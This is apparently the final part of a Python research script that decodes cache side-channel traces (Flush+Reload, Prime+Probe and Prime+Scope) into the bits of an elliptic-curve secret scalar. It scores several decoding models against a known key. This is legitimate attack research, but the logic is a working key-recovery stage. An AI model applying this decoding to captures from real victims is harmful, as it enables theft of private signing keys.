    parser.add_argument("--key", required=True, help="key file the capture used: ec_key_<i>.json pool entry or raw-hex scalar")
    parser.add_argument("--debug", action="store_true", help="per-trace diagnostics")
    parser.add_argument("--oracle", action="store_true",
                        help="score against victim_bits.txt (-bits captures): "
                             "separates slot-alignment error from detection error")
    parser.add_argument("--primitive", choices=("fr", "ps", "pp"),
                        help="override the capture's recorded primitive")
    parser.add_argument("--ratio", type=float,
                        help=f"per-slot marker/clock ratio above which a slot is "
                             f"a 0-bit, used for per-trace labels "
                             f"(default {ratio_thresh})")
    parser.add_argument("--lo", type=float,
                        help=f"fixed-band vote: mean scaled marker count <= lo "
                             f"-> 1 (default {band_lo})")
    parser.add_argument("--hi", type=float,
                        help=f"fixed-band vote: mean scaled marker count >= hi "
                             f"-> 0 (default {band_hi})")
    parser.add_argument("--band", action="store_true",
                        help="force the fixed-band vote instead of the history "
                             "model (it is used automatically when the history "
                             "model cannot anchor, e.g. a constant scalar)")
    parser.add_argument("--llr-margin", type=float,
                        help=f"history decode: |LLR| below this -> unknown "
                             f"(default {llr_margin}; 0 labels every bit)")
    parser.add_argument("--llr-folds", type=int,
                        help=f"history decode: report only bits on which this "
                             f"many disjoint trace subsets agree with the full "
                             f"decode (default {llr_folds}, 1 disables)")
    parser.add_argument("--halfwidth", type=float,
                        help=f"history decode: half-width of the window used to "
                             f"locate the 0-cluster (default {mode_halfwidth})")
    parser.add_argument("--history-taps", type=int,
                        help=f"history decode: order K of the FIR contamination "
                             f"model (default {history_taps}; must be >=1 "
                             f"-- see the note on the constant)")
    parser.add_argument("--history-ridge", type=float,
                        help=f"history decode: ridge penalty on the FIR weights "
                             f"(default {history_ridge})")
    parser.add_argument("--counts", dest="counts", action="store_true",
                        default=None,
                        help="decode P+P by per-slot count likelihood instead "
                             "of the default (F+R-style history model on the "
                             "marker/clock ratio, self.scores) -- measured "
                             "WORSE on both captures tested (32-34 wrong "
                             "against 3-11), kept for comparison and for a "
                             "capture too thin for the history model to "
                             "return many known bits")
    parser.add_argument("--no-counts", dest="counts", action="store_false",
                        help="same as the default; kept for scripts that "
                             "already pass it")
    parser.add_argument("--matched", dest="matched", action="store_true",
                        default=None,
                        help="force the matched (lagged-kernel + Viterbi) "
                             "decode; it is the default for P+S captures, "
                             "whose response peaks at lag 1")
    parser.add_argument("--no-matched", dest="matched", action="store_false",
                        help="decode a P+S capture with the F+R history model "
                             "(reads each bit off its neighbour: ~chance)")
    parser.add_argument("--posterior", type=float,
                        help=f"matched decode: per-bit posterior below which a "
                             f"bit is left unknown (default {ps_posterior})")
    parser.add_argument("--profile-dir",
                        help="matched decode: capture of a KNOWN scalar to fit "
                             "the kernel on, instead of fitting it blind. The "
                             "shape belongs to the primitive and the machine, "
                             "not the key, so it transfers between captures")
    parser.add_argument("--profile-key",
                        help="key file for --profile-dir")
    args = parser.parse_args()

    if args.ratio is not None:
        ratio_thresh = args.ratio
    if args.lo is not None:
        band_lo = args.lo
    if args.hi is not None:
        band_hi = args.hi
    if args.llr_margin is not None:
        llr_margin = args.llr_margin
    if args.llr_folds is not None:
        llr_folds = args.llr_folds
    if args.halfwidth is not None:
        mode_halfwidth = args.halfwidth
    if args.history_taps is not None:
        history_taps = args.history_taps
    if args.history_ridge is not None:
        history_ridge = args.history_ridge
    if args.posterior is not None:
        ps_posterior = args.posterior

    directory = args.directory or os.path.dirname(args.file)
    builtin_lines, primitive = load_builtin_lines(directory)
    if args.primitive:
        primitive = args.primitive
    print(f"capture {directory}")
    print(f"  primitive {primitive}, channels: " + ", ".join(
        f"col{i} role '{r.role}' {r.handler}+{r.off}"
        for i, r in enumerate(builtin_lines)))

    skey = EC_KEY.load(args.key, builtin_lines, primitive)
    print(f"  secret scalar: {skey.secret_key_bits} bits (MSB-first)")

    if args.file:
        skey.infer_file(args.file, args.debug)
    else:
        skey.infer_directory(directory, args.debug)

    skey.align_candidates(verbose=args.debug)
    if not skey.infer_keys:
        print("No traces decoded; run with --debug to see why.")
        if args.oracle:
            score_oracle(directory, builtin_lines, primitive, skey.secret_key_bits)
        raise SystemExit(1)

    kept = skey.all_traces()
    print(f"\ndecoded {len(kept)} traces")

    # The matched decode is the default for P+S, whose response peaks at lag 1;
    # running the F+R history model on it reads every bit off its neighbour.
    # It is NOT a fallback for P+P: P+P's response has no lag to deconvolve,
    # so vote_matched only adds a kernel fit vote_history does not need.
    matched = (primitive == "ps") if args.matched is None else args.matched
    # vote_counts was the intended default for P+P but is no longer it -- see
    # its docstring. --counts still forces it, for comparison or a capture
    # thin enough that vote_history returns too few known bits to be useful.
    counts = bool(args.counts)

    kernel = None
    if matched and args.profile_dir:
        if not args.profile_key:
            raise SystemExit("--profile-dir needs --profile-key")
        p_lines, p_prim = load_builtin_lines(args.profile_dir)
        pkey = EC_KEY.load(args.profile_key, p_lines, p_prim)
        pkey.infer_directory(args.profile_dir)
        pkey.align_candidates()
        if not pkey.infer_keys:
            raise SystemExit(f"no traces decoded in {args.profile_dir}")
        kernel = pkey.profile_kernel(pkey.all_traces())
        print(f"  kernel profiled on {args.profile_dir}: "
              f"c={kernel[0]:.3f} h={[round(float(v), 3) for v in kernel[1]]}")

    if args.band:
        pred, st = skey.vote(kept)
    elif counts:
        pred, st = skey.vote_counts(kept)
    elif matched:
        pred, st = skey.vote_matched(kept, kernel=kernel)
    else:
        pred, st = skey.vote_history(kept, llr_margin, llr_folds)

    # Both model-based decodes fall back to the fixed band when they cannot fit
    # (a constant scalar has no 0-cluster to anchor on; a thin capture has too
    # few finite slots to fit a kernel), and the fallback carries no "model" --
    # so the header is chosen by what came back, not by what was requested.
    if "counts_model" in st:
        e = st["counts_model"]
        nm = ["P(k|0,prev 0)", "P(k|0,prev 1)", "P(k|1,prev 0)", "P(k|1,prev 1)"]
        head = ("VOTE: count sequence model, k=0..5\n        "
                + "\n        ".join(f"{a}={list(b)}" for a, b in zip(nm, e)))
    elif "model" not in st:
        why = ("no 0-cluster to anchor the history model"
               if not matched else "too few resolved slots to fit a kernel")
        head = (f"VOTE: fixed band {st['band']}"
                if args.band else
                f"VOTE: {why} (constant scalar or thin capture) -- "
                f"fixed band {st['band']}")
    elif matched:
        h, c, sd, how = st["model"]
        head = (f"VOTE: matched filter ({how}) h={list(h)} c={c} sd={sd}, "
                f"posterior >= {ps_posterior}")
    else:
        shape, a, sd_a, sd_1 = st["model"]
        eff = st.get("folds", llr_folds)
        head = (f"VOTE: history model FIR w={list(shape)} "
                f"A={a}+-{sd_a} sd_1={sd_1}, llr margin {llr_margin}, "
                f"{eff} fold(s)"
                + (f" (asked for {llr_folds}; needs {4 * llr_folds} traces, "
                   f"have {st['traces']})" if eff != llr_folds else ""))

    pa = np.array(skey.per_trace_accuracy(kept))
    nbits = st["known"] + st["unknown"]
    acc = "  None " if st["known_acc"] is None else f"{st['known_acc']:.5f}"
    print(f"\n{head}")
    print(f"  known {st['known']:>4} ({100 * st['known'] / nbits:5.2f}%) | "
          f"unknown {st['unknown']:>4} ({100 * st['unknown'] / nbits:5.2f}%) | "
          f"wrong {st['wrong']:>3} | known-acc {acc} | {st['traces']} traces")
    print(f"  per-kept-trace acc (co-decided bits): mean {pa.mean():.5f} "
          f"min {pa.min():.5f} max {pa.max():.5f}")
    if st["wrong"] == 0 and st["unknown"] == 0:
        print("FULL KEY RECOVERED (0 wrong, 0 unknown).")
    elif st["wrong"] == 0:
        print(f"0 wrong ({st['unknown']} unknown bits left for key-recovery).")

    print_key_comparison(skey.secret_key_bin, pred)

    if args.oracle:
        score_oracle(directory, builtin_lines, primitive, skey.secret_key_bits,
                     dict(skey.infer_keys), skey.period, skey.offset,
                     skey.phase)
